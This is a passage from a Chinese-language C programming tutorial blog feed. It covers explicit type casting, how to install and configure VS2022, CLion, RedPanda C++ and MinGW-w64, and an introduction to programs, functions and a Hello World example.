class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="显式-强制-类型转换">显式(强制)类型转换</h3><p>与之对应的,我们可以进行<code>显式类型转换(或者说强制类型转换)</code>,使用方式是在要提升的值前加一对小括号,括号内写要转换为的类型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>,b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, (<span class="type">double</span>)a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此程序同样输出<code>1.500000</code></p><p>需要注意的是,由于<code>强制类型转换</code>的<code>优先级</code>大于<code>/</code>运算符,因此实际上被强制类型转换的是<code>a</code>,然后<code>b</code>被隐式转换为double类型,和提升后的<code>a</code>进行运算,最终的结果是double类型.</p><h3 id="类型转换与运算符">类型转换与运算符</h3><p>实际上,如果某个运算符的两个操作数类型不同,那么该运算符会先将精度更低的操作数隐式类型转换(也就是所谓的类型提升)为精度更高的操作数的类型,然后再以该类型进行运算,以保证类型匹配,同时避免精度损失.</p><p>当然,这种转换是有限度的,如果两种类型完全无法兼容,那么会报错.</p><h1 id="附注">附注</h1><h2 id="标准中对算数类型的定义">标准中对算数类型的定义</h2><p>可以参阅</p><p><a href="https://zh.cppreference.com/w/c/language/arithmetic_types">https://zh.cppreference.com/w/c/language/arithmetic_types</a></p><p>中的内容,对各种类型都有明确清晰的描述.</p><p>里面不仅有类型的用途,大小,并且还有它们取值范围的参考.</p><br><br><p>上一篇:<a href="../2023-09-19-bb3b8099b657/">c语言教程-2-环境搭建</a></p><p>下一篇:<a href="../2023-10-18-427f4611cc41/">C语言教程-3_2-基本输入输出</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-2-环境搭建</title>
      <link href="/2023-09-19-bb3b8099b657/"/>
      <url>/2023-09-19-bb3b8099b657/</url>
      
        <content type="html"><![CDATA[<p>无论什么语言的学习,都需要搭建学习环境,事实上,对于编程而言,我们搭建的学习环境,其实基本就是真正的开发环境.</p><p>本章系统讲解几种常见软件(工具)的安装.此外,也会花费一些功夫聊聊软件的选择.</p><h1 id="c语言编译环境需要什么">C语言编译环境需要什么</h1><p>前面提到,C语言是编译型语言,所以需要<code>编译器</code>来进行特定环境下的编译,如果你的C代码写的有较高的兼容性,亦或跨平台性强,那么无论是在什么架构/操作系统下进行编译都能得到良好稳定的结果.</p><p>无论是在Linux,Windows,macos或者是大多数人接触不到的UNIX,都有各自的编译器可供使用.从理论上,我们仅仅需要一个文本编辑器(例如Windows自带的记事本),并安装一个编译器即可开始编写C代码.</p><h2 id="一个文本编辑器">一个文本编辑器?</h2><p>但是,写代码并不是写普通的文章,一段C语言的源代码虽然是纯文本,但是它有着特定的格式,记事本的效果完全是普通的txt,<code>看起来非常简陋</code>,并且仅仅只能编辑代码,不能够执行,所以我们需要使用专用的代码编辑器(往往有插件等来提供运行支持)来进行编写.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929144305925.png" alt="image-20230929144305925" style="zoom: 40%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929144604887.png" alt="image-20230929144604887" style="zoom:33%;" /><p>上面的两张图分别是普通的<code>记事本</code>和专业的<code>Sublime Text4</code>代码编辑器对同一段代码的显示效果,差别一眼可见!</p><h2 id="一个编译器">一个编译器?</h2><p>另一方面,我们其实很少直接使用单独的编译器进行编译,因为我们更希望将整个开发过程集成于一个大型的软件,更加方便,安装IDE(集成开发环境)就是我们实际上最常用的方式.当然,你也可以找一个你喜欢的文本编辑器去编写代码,然后在控制台中输入命令进行手动编译生成可执行文件.</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929145507164.png" alt="image-20230929145507164"><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929145055586.png" alt="image-20230929145055586" style="zoom:45%;" /></p><h2 id="我们要使用什么">我们要使用什么?</h2><p>作为初学者,各位一开始编写的都是简单的代码,但是就算是简单的代码,仅仅为了一个测试就要切换好几个软件未免也太费劲了,所以,我们仍然建议使用一款集成的软件,尽可能的在一个软件完成所有的工作.</p><p>所以我接下来讲解的基本都是IDE的安装,那么至于编译器工具链的安装会在其中穿插讲解.</p><h1 id="windows平台">Windows平台</h1><p>学习编程最常用的平台还是Windows,并且现在基本都是64位的系统,所以并不存在32位的限制.</p><p>Windows平台有许多软件可供使用,例如Visual Studio(vS),Visual C++(VC++),DEV-C++,CLion,VSCode等等都可以选择,我个人从一个初学者的角度出发,推荐使用VS,CLion,或者小熊猫C++这3款.</p><p>大多数课程老师/视频都会推荐你去安装<code>Visual C++ 2010</code>,<code>Visual C++6.0</code>,但是他们或多或少有些老了,当然对于初学者朋友们足够了,但是现在(2023年)了,我们还是希望各位能够跟进更新,使用较为新的软件.特别是<code>Visual C++6.0</code>未免太过老旧(我当初好几年前自学的时候用的这玩意,2023年了,也该换了吧…)</p><h2 id="我建议使用什么软件">我建议使用什么软件</h2><ol><li>较新的软件中,非常出名的是<code>Visual Studio 2022</code>,不过本人这里是相对<code>不建议的</code>.它并不是一个C专门的IDE,实际上他对于C语言的支持远远没有其他软件好,如果你也觉得VS2022未免太过麻烦,可以直接换软件,我们以学习技术为主,不要把时间浪费在折腾软件上.</li></ol><p><s>但是VS的调试功能是真的nb.</s></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151338821.png" alt="image-20230929151338821" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151417364.png" alt="image-20230929151417364" style="zoom: 25%;" /><ol start="2"><li>然后还有一个出名的,新手常常误以为和<code>VS</code>是一个系列的软件的,叫做<code>VSCode</code>,简称<code>VSC</code>(蓝色的那个),它和VS(紫色的那个,例如VS2022)系列完全没有任何关系.<code>VSC</code>是开源软件,它依赖各式各样的插件,所以非常考验用户的配置能力,相对对新手极其不友好!所以我不建议使用,特别是对于零基础的朋友.当然,<code>VSC</code>配置好了还是很强大的,毕竟它精简干练.</li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151509660.png" alt="image-20230929151509660" style="zoom:25%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151641824.png" alt="image-20230929151641824" style="zoom:25%;" /><ol start="3"><li>接下来,我个人建议(强推)的是<code>CLion</code>,这是一个收费软件,并且它基于java开发,所以响应速度上可能稍慢.</li></ol><p>但是,各位想必都是学生,我们可以通过Jetbrain公司(CLion的开发公司)的学生认证来免费使用其专业版!认证非常简单,具体后面再说.</p><p>另外,2023年了,各位大学生的电脑应该都不会差,毕竟大家更多考虑的是能不能流畅玩游戏—中端游戏都能玩了,CLion还带不起来?那不是开玩笑么.并且,各位一般编写代码的速度比它响应你的速度要慢多了…所以,不要去关心那些没有任何必要的细节,CLion是专业的C/C++的IDE,对于C/C++的支持性极高!如果你在其他软件上跑不了代码,可能是软件的问题,但是如果是CLion上,那么大概率是你的使用/代码问题(手动滑稽).</p><p>最香的是!好看!主题高度可定制化!下图就是我自己配置的一套配色(Monokai)!</p><p>总之,CLion这个收费软件还是非常好的,毕竟花钱玩意,学生认证他不香吗…doge</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929151909255.png" alt="image-20230929151909255" style="zoom:25%;" /><ol start="4"><li>虽然但是,CLion对于一些朋友可能确实不能接受,也没关系,我们可以使用一个精简的开发环境—小熊猫C++,他是基于DevC++进一步开发而来,目前已支持gcc12编译器,而且,修复了许多DevC++这款软件中的许多问题.</li></ol><p>如果各位之前使用DevC++,并且恰巧受够了Dev的一些奇葩问题,不妨来试试小熊猫C++.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929152018631.png" alt="image-20230929152018631" style="zoom:25%;" /><h2 id="vs2022的安装">VS2022的安装</h2><p>VS2022是微软的一款IDE,他可以进行包括但不限于C,C++,Python等等的各种语言的开发,号称宇宙第一IDE(功能极其强大),我作为一名使用C的学生,最让我觉得舒服的地方就是他的调试功能,VS的调试功能可以说是非常强大,这一点上CLion就显得比较弱势.但是,<s>VS有点丑</s>.而且文件太多,新手很容易被搞得晕头转向的,默认情况你只能在一个项目包含一个程序,而不能在一个项目里编写多个程序,这也是许多新手常常遇到的问题.</p><p>VS默认使用微软自家的编译器msvc进行编译构建,另外也可以切换成clang(LLVM)编译器.</p><p>但是实际上VS不是针对C开发的…对C的支持相当于附带…毕竟C++基本兼容C.</p><p>而且,初学者200%会遇到scanf和scanf_s这两个东西的问题…</p><h3 id="安装步骤">安装步骤:</h3><p>1.下载安装包</p><p>下载community版本!下载community版本!下载community版本!重要的事情说三遍,VS社区版不收费!!!</p><p>请认准官网,不要下载到盗版的什么安装助手.<a href="https://visualstudio.microsoft.com/zh-hans/vs/">https://visualstudio.microsoft.com/zh-hans/vs/</a></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919185951583.png" alt="image-20230919185951583"></p><p>2.下载后直接运行,等待初始化完成后进行选择,由于我已经安装过所以显示的是修改,实际要点安装community版</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190144768.png" alt="image-20230919190144768"></p><p>3.点击安装后只在工作负荷中选择&quot;使用C++的桌面开发&quot;,其他的什么都不用管!</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190249856.png" alt="image-20230919190249856" style="zoom:50%;" /><p>4.然后如果你有D盘,并且空间足够的话,最好点击安装位置,将所有你能看到的路径全部由C:\改成D:,因为VS比较庞大,放C盘容易炸.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190426282.png" alt="image-20230919190426282"></p><p>5.然后右下角点击安装即可.</p><p>安装完成后关闭安装工具,就可以直接开始使用了,VS默认使用MSVC编译器,所以你无需再另外安装编译器.</p><h3 id="测试是否安装成功">测试是否安装成功</h3><p>打开VS2022软件,我们就可以创建第一个项目,来编写一个hello world程序,这时你最好要提前想好你的代码都要存到哪里,方便找到,或者你实在不会就选默认也行.</p><p>点击创建新项目:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190741202.png" alt="image-20230919190741202" style="zoom:50%;" /><p>选择&quot;控制台应用&quot;或者&quot;空项目&quot;,注意一定要确保标签写着C++而不是其他语言.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919190855983.png" alt="image-20230919190855983"></p><p>接着项目名和解决方案名随便你起,例如test1就可以:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191040111.png" alt="image-20230919191040111" style="zoom:50%;" /><p>如果你选择的是控制台应用,那么VS会默认给你创建一个main.cpp,无需你进行创建,如果你选择的是空项目,那么还需要手动添加一个源文件—在左侧的解决方案资源管理器中右键&quot;源文件&quot;文件夹,点击添加-&gt;新建项,然后可以创建一个main.cpp:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191305052.png" alt="image-20230919191305052" style="zoom:50%;" /><p>这时候一个项目就完全创建好了,你可以在main.cpp中进行编写代码,例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191416465.png" alt="image-20230919191416465"></p><p>此外,我的VS因为之前设置过主题和配色,比默认的好看多了,你如果想美化请自行百度/必应/谷歌.</p><p>运行代码,点击上方的绿色的&quot;播放&quot;按钮即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919191534004.png" alt="image-20230919191534004"></p><p>如果程序正常运行,那么恭喜你,你的VS2022已经成功安装.</p><h3 id="注意事项-必须看">注意事项(必须看)</h3><p>另外,要注意的一点就是,VS默认是进行C++的开发,所以你会发现后缀都是.cpp,你改成.c也可以.还有很重要的一点就是,msvc(或者说VS这个IDE)默认是不允许使用scanf等函数的,因为他认为这些函数并不安全(具体原因以后解释,涉及到越界/栈溢出的问题),所以转而要求你使用scanf_s等函数来代替,报错如图:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192737049.png" alt="image-20230919192737049"></p><p>报错是英文的:<code>'scanf': This function or variable may be unsafe.</code>,所以英语也要多少会一点,不至于连报错提示都看不懂.</p><p>但是,我想说一句话:</p><p><code>学习过程中你可以犯错,让编译器去迁就你,但是如果你要去因为一个编译器的特殊性,你要去迁就编译器,那你这学的就一塌糊涂</code></p><p>我们学C,首先要学的就是标准C,至少也得是ANSI C,不过2023年了,我们至少要学习C99的标准.</p><p>scanf_s等函数是在C11才出现的,目前各大编译器的支持度不高,而且scanf_s和scanf的使用方法也并不相同,所以,一句话,不要使用scanf_s.</p><p>注:解决的是<code>错误</code>,即使用scanf编译会报错,而警告<code>scanf的返回值被忽略</code>不仅仅是VS会警告,其他软件也会警告,这是一个良好的警告,但我们无需关心—scanf的返回值确实有用,但是简单的程序用不到.</p><p>那么为了在VS中正常使用scanf等函数,我们有三种解决办法:</p><h4 id="方法1">方法1:</h4><p>关闭SDL检查</p><p>SDL(Security Development Lifecycle)，安全开发生命周期检查，微软在VS2012新推出的东西，为了能更好的监管开发者的代码安全，如果勾选了这一项则将严格按照SDL的规则编译代码，会有一些以前常用的函数无法通过编译。</p><p>我们只需要把项目的SDL检查关闭即可,<code>注意:每次新建项目都需要进行处理,包括下面的其他方法!</code></p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C/C+±&gt;常规-&gt;SDL检查:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928163054328.png" alt="image-20230928163054328" style="zoom:33%;" /><p>将SDL检查从<code>是</code>修改为<code>否</code>即可.</p><h4 id="方法2">方法2:</h4><p>为项目添加<code>_CRT_SECURE_NO_DEPRECATE</code>预处理器定义</p><p>在菜单栏依次点击 项目-&gt;[你的项目名]属性,打开属性窗口,再次点击 配置属性-&gt;C/C+±&gt;预处理器-&gt;预处理器定义:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919192447314.png" alt="image-20230919192447314" style="zoom: 33%;" /><p>在结尾先添加一个<code>;</code> ,然后输入<code>_CRT_SECURE_NO_DEPRECATE</code>这一段,点击保存,这时,回到你的包含scanf的程序,再次运行,即可正常:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193040954.png" alt="image-20230919193040954" style="zoom: 33%;" /><h4 id="方法3">方法3:</h4><p>在每个源文件开头添加一行代码:<code>#define _CRT_SECURE_NO_WARNINGS 1</code>即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919193744735.png" alt="image-20230919193744735" style="zoom:33%;" /><p>到此为止,VS2022的基本安装结束,以后遇到任何问题,请不要吝惜你的浏览器,先去网上找解决方案,一搜一大把.</p><h2 id="clion的安装">CLion的安装</h2><p>有句玩笑话:“VS对C语言的支持是充话费送的”,确实VS其实是用于编写C++的,但是因为C++和C的关系,也是支持C的,不过可能支持的不是那么好…</p><p>而Clion就是Jetbrain家专门为C/C++设计的IDE,可以说目前常用的IDE中对C语言支持度最高的就是CLion了,但是他的弱点就是启动速度可能比VS还慢…貌似是java写的软件…而且启动后比VS还要占内存空间…</p><p>但是…现在的笔记本电脑卷的一批,随便五六千的电脑都能带起一些3a大作游戏,那么带这些IDE那不是轻轻松松?所以别管那么多,用就完事了,如果你觉得VS实在不好用,或者嫌VS丑,欢迎试试CLion,我个人还装了一个彩色括号的插件,而且配色主题都是自己定制的,随心所欲:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919202458092.png" alt="image-20230919202458092"></p><p>不过,Clion有个问题就是…他收费…但是…初学者大多都是学生吧…Jetbrain是有针对大学生的学生认证的,可以直接免费使用,具体认证方式请自行百度,非常容易.当然,还有一种方式那就是pojie…</p><p>总之,这里仅介绍CLion的安装</p><h3 id="安装步骤">安装步骤:</h3><p>1.找到官网下载professional版本即可,一路默认正常安装即可,遇到注册码先点击试用,然后去进行学生认证.</p><p>2.安装编译器</p><p>首先你可以自行安装MinGW-w64工具链(也就是之前说的独立的编译器,里面包含了gcc等所有工具),安装方法在后面.</p><p>或者可以从CLion中下载:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919195419921.png" alt="image-20230919195419921" style="zoom: 50%;" /><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919195801517.png" alt="image-20230919195801517"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200413303.png" alt="image-20230919200413303"></p><p>总之你要安装并配置好MinGW这个工具链才行,很简单的.</p><p>自己配置和从Clion下载是一样的.</p><p>安装好后你就已经完成了,和VS不同,CLion默认使用CMake来管理项目,而且支持一个项目中单个文件的编译执行:</p><h3 id="单文件的编译运行">单文件的编译运行</h3><p>点击main函数头左侧的绿色按钮,点击运行便可直接运行单个文件:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200730155.png" alt="image-20230919200730155"></p><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919200839316.png" alt="image-20230919200839316" style="zoom:33%;" /><p>测试成功.</p><p>到此为止,CLion的安装结束,具体使用可以去了解CMake的使用,基本的语法非常简单,可以自行百度.</p><h2 id="小熊猫c-的安装">小熊猫C++的安装</h2><p>官网:<a href="https://royqh.net/redpandacpp/">https://royqh.net/redpandacpp/</a></p><p>小熊猫C++就是修改后的DEVC++,比devc++好用的多,而且支持最新的gcc12:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230919201029204.png" alt="image-20230919201029204"></p><p>安装非常简单,百度找到官网下载<code>自带编译器</code>的版本进行安装即可.</p><p>注:如果你会自行配置编译器(MinGW工具链),也可以下载不带编译器的版本.</p><h2 id="mingw-w64工具链的安装-编译器安装">MinGW-w64工具链的安装(编译器安装)</h2><p>可能很多朋友需要自行安装编译器(例如安装CLion),这里讲解如何安装.</p><p>gcc编译器实际上是linux平台的软件,MinGW就是将gcc移植到Windows的项目.</p><p>MinGW有好多版本,我们无需关心…只需要选择我们需要的就好.</p><h3 id="项目网址">项目网址:</h3><p><a href="https://github.com/niXman/mingw-builds-binaries/releases">https://github.com/niXman/mingw-builds-binaries/releases</a></p><p>这里有这个项目的各个版本,托管在github上,各位可能需要科学上网</p><h3 id="选择版本">选择版本:</h3><p>我们选择最近的版本即可,目前是13.1.0版本,我们可以发现好几个文件,我们选择这个:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929152703373.png" alt="image-20230929152703373" style="zoom:33%;" /><p>下载的是一个7z压缩包,我们将其解压,解压出来的目录里面就已经可以使用了,无需安装!</p><p>点开里面有一个mingw64文件夹,再进入后有一个bin文件夹,我们使用的gcc编译器就在这个目录里面:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929152902834.png" alt="image-20230929152902834" style="zoom:33%;" /><h3 id="配置环境变量">配置环境变量:</h3><p>但是因为这相当于一个软件集,我们需要把他放在一个妥善的位置,例如D:\devtools\mingw64中</p><p>我们将其放在一个妥善的目录(<code>千万不要放在包含中文的路径下</code>!,例如D:\C语言软件\mingw64就不可以!),然后需要将刚刚说的bin目录加入系统环境变量,以方便终端能找到gcc编译器.</p><p>这里假定我们把mingw64放到了<code>D:\devtools\mingw64</code>中(外面那个超长的文件夹也可以保留,无所谓),那么我们按Win键,直接搜索<code>环境变量</code>,打开找到的<code>编辑系统环境变量</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929153352568.png" alt="image-20230929153352568" style="zoom:33%;" /><p>如果你的电脑不是win11,而是win7等版本,可以上网百度如何修改系统环境变量,方法大同小异.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929153707199.png" alt="image-20230929153707199" style="zoom:33%;" /><p>依次点击<code>高级-&gt;环境变量-&gt;系统变量</code>,然后在下面找到<code>Path</code>这个变量,双击打开,然后把这个目录添加到新的一行:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929153943782.png" alt="image-20230929153943782" style="zoom:33%;" /><p>如果你的目录跟我的不一样,请自行修改成你自己的目录!</p><p>随后,一路点击保存,直到所有的窗口关闭.这时候,不出意外的话我们已经装好了!</p><h3 id="测试是否安装成功">测试是否安装成功:</h3><p>我们按<code>Win+r</code>快捷键,打开<code>运行</code>窗口,输入<code>cmd</code>然后按回车,打开终端:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929154210110.png" alt="image-20230929154210110" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929154221912.png" alt="image-20230929154221912" style="zoom:33%;" /><p>在终端输入命令:<code>gcc --version</code>测试gcc是否正常安装:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929154304259.png" alt="image-20230929154304259" style="zoom:33%;" /><p>如果出现类似的信息,则说明成功安装,否则,如果报错<code>gcc不是内部或外部命令，也不是可运行的程序或批处理文件</code>,说明安装出错,需要重新检查各个步骤!</p><h1 id="macos和linux">MacOS和Linux</h1><h2 id="linux">Linux</h2><p>由于Linux的发展历史,Linux这种&quot;类UNIX&quot;操作系统对C语言高度支持!</p><p>所以,几乎所有的Linux发行版都默认安装有C语言的编译器(一般都是gcc).</p><p>Linux,使用终端手动调用gcc进行编译,可以装一个文本编辑器来使用,例如Sublimetext4.或者,Clion和VSCode也有Linux平台的支持.</p><h2 id="macos">MacOS</h2><p>至于MacOS,我没用过,所以没法写教程,大多可能使用VSCode或Xcode.</p><p>​—WAHAHA,2023.11.07 修改</p><br><br><p>上一篇:<a href="../2023-09-30-4deceb66e98f/">c语言教程-1_2-关键概念</a></p><p>下一篇:<a href="../2023-09-20-949602bbfb8e/">c语言教程-3_1-数据类型</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_1-什么是程序</title>
      <link href="/2023-09-19-d1f77d78f8b6/"/>
      <url>/2023-09-19-d1f77d78f8b6/</url>
      
        <content type="html"><![CDATA[<h1 id="c语言概述">C语言概述</h1><h2 id="编程语言与算法">编程语言与算法</h2><p>首先，关于C语言的历史发展，您应该去书上找到答案，而不是在这里快速浏览的一带而过。</p><p>那么，C语言是属于一门编程语言，而且是属于一种高级语言（代码是接近自然语言的表述），但同时由于其独特的指针等特性，说他是中级语言也不为过。作为编程语言，其作用自然是显而易见—用于描述算法。</p><p>我个人不愿意把算法这个东西神秘化，很多东西都能叫算法，大到一个高级的数学问题求解，小到如何做出一道菜，都可以成为“算法”。我不愿意去搬一些砖头书的标准概念—我这也算是感想笔记，简单来说，算法有三个要素：前提条件，目的，过程。</p><p>前提条件，就是完成一个算法的要求。例如做一道菜，你需要准备的食材，工具；计算a+b=c这个算法，你需要给我提供a，b这两个数。</p><p>目的，就是这个算法到底要干什么。例如我要做出一道菜；我要算出a+b的和c这个数。</p><p>过程，就是到底如何操作。例如我要切菜，煮菜，调味等等；我要把a和b做一个竖式计算。</p><p>以上都完备，且确认均正确无误，就可以成为一个完整的算法。也就是说，甚至一个windows操作系统某种程度上也可以说是一个算法—我有机器设备，能源，数据来源；我要用于计算/为用户提供服务；我有自己的底层逻辑来完成以上所有的功能。</p><p>那么，想要描述一个算法，就要用到专门的记录语言—编程语言，那么C语言就是其中的独特的一种。</p><h2 id="c语言的特点">C语言的特点</h2><p>编程语言有一些特点：</p><p>静态(C,JAVA,C++等)/动态类型(Python,JavaScript等)语言</p><p>弱类型(VB)/强类型(C,JAVA,C++,Python)语言</p><p>编译型(C,C++,RUST)/解释型(Python/JavaScript)/介于两者之间的(JAVA)语言</p><p>面向过程(C,FORTRAN)/基于对象(JavaScript)/面向对象(Python,JAVA)/既可面向对象也可面向过程(C++)语言</p><p>其中,C语言的特性如上所述。具体都是什么意思请百度，不知道也没有关系，学到其他语言自然就能体会巨大的差异了。</p><p>C语言的强类型，静态类型我个人认为不容易出错，但是相对的缺少灵活性（尽管C本身以灵活著称）。毕竟是一门古老，极其精简的语言了。你会发现，越发复杂，支持各种高级操作的语言，其底层代码就更加复杂，而C语言如此精简，势必会显得单薄—除非是有别人写好的库，不然你都得自己重头写起。</p><p>作为一门老语言，当然只支持面向过程，同时也支持函数式编程（一定程度上模块化），学C，就不要羡慕其他语言，如果你真的羡慕，那么你干嘛要选择C呢？</p><h1 id="c语言是如何运作的">C语言是如何运作的</h1><h2 id="c代码是怎么样的">C代码是怎么样的</h2><p>我们上一个最简单，最经典的代码—Hello World！程序，作为经典的入门代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一段注释---这是一个hello world程序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 这是一行注释</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> <span class="comment">//包含一个头文件stdio.h,其中</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;<span class="comment">// 这是一个函数,而且是C程序的入口,一切必须从这里开始执行</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>); <span class="comment">// printf是一个函数,用于输出一个字符串,这里输出&quot;Hello World！&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 代表结束main函数,并返回一个0,这里先不用关心其作用,只要记住main函数要加上这条语句即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面将程序拆解为几块来分别进行讲解:</p><h3 id="头文件包含-include-stdio-h">头文件包含#include&lt;stdio.h&gt;</h3><p>作为描述算法的语言，与过程不可分割，一个大型算法中会包含许多小操作，这些小操作甚至也是一些子算法，整个算法分为几个不同的步骤去进行，其中一些最基本的不可或缺的操作/已经开发好的算法/处理操作就没有必要再去手动重新编写，也就是说别人已经造好了轮子，你先拿来用就行。也就是说C语言也有许多写好的“库”可以直接使用，我们想要使用它们，一般（不是绝对）都要加上库自带（提前写好的）的“导入信息”，C语言中称为<strong>头文件</strong>。实际上，头文件包含了许多函数/自定义类型等元素的声明（后面说明），想要使用某个函数，那么必须让编译器知道我导入了这个函数（事先声明好）。</p><h3 id="主函数main">主函数main()</h3><p>无规矩不成方圆，一个程序必须有管事的老大，一切运算必须从main()函数开始(也就是主函数),无论执行什么函数,都必须从main()中开始调用或者由其他函数进行进一步的调用。</p><p><code>int main()</code>叫做main函数的<code>函数头</code>,它包含了这个函数的基本信息—函数的名称,需要传递的参数,函数的返回值类型.c语言的函数和数学意义上的函数完全等价,例如f(x)=x+1,其中x为整数 这个函数就可以写为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123; </span><br><span class="line"><span class="comment">// int 代表x为整型变量(保存整数),第一个int代表这个函数返回值(可以理解为f(x))为整型;</span></span><br><span class="line"><span class="comment">// 第二个 int 代表这个函数的参数(即x)为整型</span></span><br><span class="line"><span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后,函数头后面紧跟的就是函数体,函数体里包含了这个函数的一切操作,函数体以{}作为边界.</p><h3 id="函数内的语句">函数内的语句</h3><p>一个函数中包含的所有内容就是这个函数要执行的运算,还有一些辅助的/必要的数据(局部变量或函数参数),每一个操作叫做一条语句,语句必须由一个;来结束,一个语句可复杂可简单,一条语句由若干个表达式构成,表达式越多,越复杂冗长,这条语句就越复杂。所以，如果可以，尽可能把一个复杂的操作分成几条语句（几步分开的操作）来运算。</p><p>例如<code>printf(&quot;Hello, World!\n&quot;);</code>这条语句就是执行了一个输出字符串的操作，其中只包含了一个表达式—函数调用表达式—调用了printf()这个函数.</p><p><strong>注意:大部分入门教程绝对不会提到&quot;函数调用表达式&quot;这个概念,请以我的说法为准!从来没有&quot;函数调用语句&quot;这个东西!</strong></p><p><strong>C语言的大部分语句是由表达式构成的!</strong></p><p>再例如<code>return 